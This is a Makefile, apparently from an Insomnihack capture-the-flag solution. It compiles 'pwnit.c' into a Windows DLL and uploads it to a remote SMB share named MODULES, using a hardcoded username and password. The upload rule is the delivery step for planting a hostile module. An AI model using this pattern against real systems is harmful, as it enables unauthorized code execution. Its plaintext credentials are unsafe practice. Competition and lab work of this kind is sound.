DLL:=pwnit$(shell date +%s).dll

.PHONY: all
all: pwn

.PHONY: pwn
pwn: $(DLL)
	smbclient --user=inso --password=TmLfgZCPh2 //leaky.insomnihack.ch/MODULES -c 'put $<'

.PHONY: fmt
fmt:
	clang-format -i pwnit.c

$(DLL): pwnit.c
	x86_64-w64-mingw32-gcc -Wall -Wextra -Werror -Os -shared $< -o $@ -lws2_32 -lntdll
